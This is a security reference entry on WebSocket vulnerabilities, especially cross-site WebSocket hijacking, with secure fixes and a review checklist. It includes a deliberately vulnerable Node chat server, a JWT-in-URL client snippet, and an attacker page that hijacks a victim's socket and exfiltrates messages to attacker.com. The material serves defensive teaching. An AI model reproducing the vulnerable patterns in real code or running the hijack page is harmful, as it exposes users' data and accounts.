# WebSocket Security Vulnerabilities

> **Severity:** High (CSWSH / auth bypass often Critical)  
> **CWE:** CWE-1385 (Missing Origin Validation in WebSockets), CWE-346 (Origin Validation Error), CWE-352 (CSRF), CWE-319 (Cleartext Transmission)  
> **AI Generation Risk:** High — AI chat/live-update samples almost never implement Origin checks, token binding, or message schema validation

---

## Vulnerability Explanation

WebSockets (RFC 6455) upgrade an HTTP connection to a persistent, full-duplex channel. Once established, the browser no longer applies the same-origin policy to individual messages the way it does for XHR/fetch. That design creates several high-impact failure modes:

1. **Cross-Site WebSocket Hijacking (CSWSH / CWE-1385)**  
   If the server authenticates the handshake only via cookies (session cookie on the Upgrade request) and does **not** validate the `Origin` header (or an equivalent anti-CSRF token), a malicious page can open a WebSocket to your API as the victim. The browser automatically attaches cookies; the attacker reads/writes on the socket and can steal data or perform actions.

2. **Missing / weak authentication on the channel**  
   Auth checked only at HTTP upgrade time, then never re-validated; long-lived sockets outlive session revocation, password change, or role change.

3. **Unvalidated message payloads**  
   Trusting JSON/binary frames without schema checks leads to injection, deserialization gadgets, path traversal in “file channel” designs, or privilege escalation via crafted `type` fields.

4. **Cleartext `ws://` in production**  
   Credentials, tokens, and PII ride an unencrypted TCP stream (MITM).

5. **Resource exhaustion / DoS**  
   No limits on concurrent connections, message size, or message rate → memory pressure and CPU burn (especially with large binary frames or compression bombs).

6. **Proxy and CDN mishandling**  
   Intermediate layers that cache or rewrite Upgrade incorrectly can break isolation or leak responses.

Unlike classic CSRF, CSWSH often yields **full read/write** of a real-time channel, which is why severity is frequently Critical for chat, trading, admin, or IoT control planes.

---

## How AI / Vibe Coding Generates This

AI coding assistants and “vibe coding” workflows produce insecure WebSocket stacks because tutorials and training snippets optimize for “it connects and echoes,” not for threat models:

- **Chat / multiplayer boilerplate** with `ws` or `socket.io` that accepts any Origin.
- **Cookie-only auth** copied from REST middleware without CSRF/Origin equivalents.
- **No per-message authorization** — once connected, any frame is trusted.
- **`ws://localhost` patterns** left in client bundles that ship to production.
- **Unbounded buffers** — `message` handlers that `JSON.parse` arbitrary size strings.
- **Socket.IO / SockJS defaults** without hardening flags documented in the same snippet.
- **Missing subprotocol negotiation** and no explicit close on policy violation.
- **AI “just make it work with React”** often wires a global socket that reconnects forever with stale JWTs in query strings (logged by proxies).

When the prompt is “add live updates,” the model rarely adds: Origin allowlist, ticket-based handshake, message schema (Zod/JSON Schema), rate limits, or forced `wss://`.

---

## Vulnerable Code Example (realistic)

### Node.js (ws) — CSWSH-prone chat API

```javascript
// server.js — AI-generated "simple chat backend"
const http = require('http');
const WebSocket = require('ws');
const session = require('express-session');

const server = http.createServer(app);
const wss = new WebSocket.Server({ server }); // 🔴 no verifyClient

// Express session cookie is sent automatically on Upgrade from the browser
app.use(session({
  secret: 'dev-secret',
  resave: false,
  saveUninitialized: true,
  cookie: { httpOnly: true, sameSite: 'lax' } // still sent cross-site on WS in many cases
}));

wss.on('connection', (socket, req) => {
  // 🔴 Assumes cookie session is enough; never checks Origin
  const user = getUserFromSession(req); // may be victim user if attacker page opened WS

  socket.on('message', (raw) => {
    // 🔴 No size limit, no schema, no authz on action
    const msg = JSON.parse(raw.toString());
    if (msg.type === 'dm') {
      sendToUser(msg.to, { from: user.id, body: msg.body });
    } else if (msg.type === 'admin_broadcast') {
      // 🔴 Privilege based only on client-supplied type field
      broadcastAll(msg.body);
    }
  });
});

server.listen(3000);
```

### Malicious page (attacker.com)

```html
<script>
  // Victim visits this page while logged into bank.example
  const ws = new WebSocket('wss://bank.example/ws');
  ws.onopen = () => ws.send(JSON.stringify({
    type: 'dm',
    to: 'attacker',
    body: 'steal session context'
  }));
  ws.onmessage = (e) => fetch('https://attacker.com/exfil', {
    method: 'POST', body: e.data
  });
</script>
```

If the bank server does not reject non-allowlisted Origins (or require a non-cookie token), the attack succeeds.

### Browser client with secrets in query string

```javascript
// 🔴 JWT in URL — ends up in access logs, Referer, proxies
const ws = new WebSocket(`ws://api.example.com/stream?token=${localStorage.jwt}`);
```

---

## Secure Code Fix

### 1) Origin validation + ticket auth (Node `ws`)

```javascript
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com'
]);

const wss = new WebSocket.Server({
  server,
  maxPayload: 64 * 1024, // 64 KiB
  verifyClient: (info, done) => {
    const origin = info.origin || info.req.headers.origin;
    if (!origin || !ALLOWED_ORIGINS.has(origin)) {
      return done(false, 403, 'Forbidden origin');
    }
    // Prefer short-lived ticket from prior authenticated HTTPS request
    const url = new URL(info.req.url, 'https://api.example.com');
    const ticket = url.searchParams.get('ticket');
    const session = redeemTicket(ticket); // one-time, bound to user + IP/UA optional
    if (!session) return done(false, 401, 'Unauthorized');
    info.req.user = session.user;
    done(true);
  }
});

wss.on('connection', (socket, req) => {
  const user = req.user;
  let msgCount = 0;
  const windowStart = Date.now();

  socket.on('message', (raw) => {
    if (raw.length > 64 * 1024) return socket.close(1009, 'too big');
    // simple rate limit
    msgCount++;
    if (Date.now() - windowStart < 1000 && msgCount > 20) {
      return socket.close(1008, 'rate limit');
    }

    let msg;
    try {
      msg = JSON.parse(raw.toString());
    } catch {
      return socket.close(1003, 'invalid json');
    }

    // Schema + authorization
    if (msg.type === 'dm') {
      if (!isValidUserId(msg.to) || typeof msg.body !== 'string' || msg.body.length > 2000) {
        return;
      }
      if (!canMessage(user, msg.to)) return;
      sendToUser(msg.to, { from: user.id, body: sanitize(msg.body) });
    }
    // Never trust client for admin actions without server-side role check
  });
});
```

### 2) Client — always `wss://`, no secrets in query long-term

```javascript
// Obtain ticket via authenticated fetch first
const { ticket } = await fetch('/api/ws-ticket', { credentials: 'include' })
  .then(r => r.json());
const ws = new WebSocket(`wss://api.example.com/stream?ticket=${ticket}`);
// Prefer subprotocol or first-message auth if query logging is a concern
```

### 3) Additional hardening

- Force TLS (`wss://` only); HSTS on the HTTP site that serves the app.
- Re-validate authorization on sensitive operations; support server-side force-disconnect on logout.
- Use `SameSite=Strict` cookies where feasible **and** still validate Origin / tickets (defense in depth).
- Cap concurrent sockets per user/IP; idle timeouts; disable unused compression or limit window sizes.
- Structured logging of rejected Origins and auth failures without logging full tokens.

---

## Prevention Checklist

- [ ] Validate `Origin` (or `Sec-WebSocket-Origin`) against a strict allowlist on every handshake
- [ ] Do not rely on cookies alone; use short-lived, single-use tickets or first-message bearer tokens
- [ ] Enforce `wss://` in production; reject cleartext upgrades at the edge
- [ ] Set `maxPayload` / max frame size; reject oversized messages early
- [ ] Rate-limit messages and connections per identity and per IP
- [ ] Schema-validate every message; never trust client-supplied roles/types for privilege
- [ ] Re-check authz for sensitive actions; push logout/revoke to open sockets
- [ ] Idle timeout and max lifetime for connections
- [ ] Avoid putting long-lived JWTs in query strings (proxy logs)
- [ ] Security tests: automated CSWSH case from a foreign Origin; fuzz message parser
- [ ] Document allowlisted origins in config, not hard-coded secrets in client bundles
- [ ] Review CDN/load-balancer WebSocket settings (sticky sessions, timeout, header passthrough)

---

## Real-World CVEs / References

| Reference | Relevance |
|-----------|-----------|
| [CWE-1385](https://cwe.mitre.org/data/definitions/1385.html) | Missing Origin Validation in WebSockets (CSWSH class) |
| [CWE-352](https://cwe.mitre.org/data/definitions/352.html) | Cross-Site Request Forgery — related browser-driven abuse of cookie auth |
| [OWASP HTML5 Security Cheat Sheet — WebSockets](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#websockets) | Origin checks, authentication, input validation guidance |
| [RFC 6455](https://datatracker.ietf.org/doc/html/rfc6455) | WebSocket protocol (Origin header semantics) |
| [PortSwigger — Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) | Practical CSWSH methodology |
| Memory-safety adjacent stacks (native WS libs) | Historical issues such as [CVE-2014-0160 Heartbleed](https://nvd.nist.gov/vuln/detail/CVE-2014-0160) show why TLS/memory safety of the transport stack still matters for any long-lived channel |

CSWSH is primarily a **logic/design** flaw rather than a single CVE ID; treat CWE-1385 and OWASP WebSocket guidance as the primary mapping, and track library-specific CVEs in your dependency scanner for `ws`, `socket.io`, nginx, and TLS stacks.

---

## Vibe-Coding Red Flags

| Red flag in AI output | Why it matters |
|----------------------|----------------|
| `new WebSocket.Server({ server })` with no `verifyClient` | Open to any Origin + cookie ride |
| “Auth is handled by express-session” only | Classic CSWSH setup |
| `ws://` in React/Vue example “for simplicity” | Ships cleartext if env not overridden |
| `?token=` on the WebSocket URL as the only auth | Token leakage via logs/Referer |
| `JSON.parse(message)` with no size/schema checks | Parser DoS + injection gadgets |
| Client decides `role: 'admin'` in first message | Trivial privilege escalation |
| Infinite reconnect without backoff or auth refresh | Stale sessions, thundering herd |
| No tests for foreign Origin handshake | Regression will reintroduce CSWSH |
| Socket.IO CORS `origin: '*'` with credentials | Equivalent to disabling origin trust |
| Shared global socket across tabs without isolation | Confused deputy / data bleed between accounts |

**Rule of thumb for review:** If the PR adds WebSockets and the diff does not mention Origin, tickets/tokens, max payload, and rate limits, treat it as insecure by default until proven otherwise.

---

*KB level: L1 common · Protocol: WebSocket · Primary abuse: CSWSH (CWE-1385) · Pair with: CORS, CSRF, auth session design*
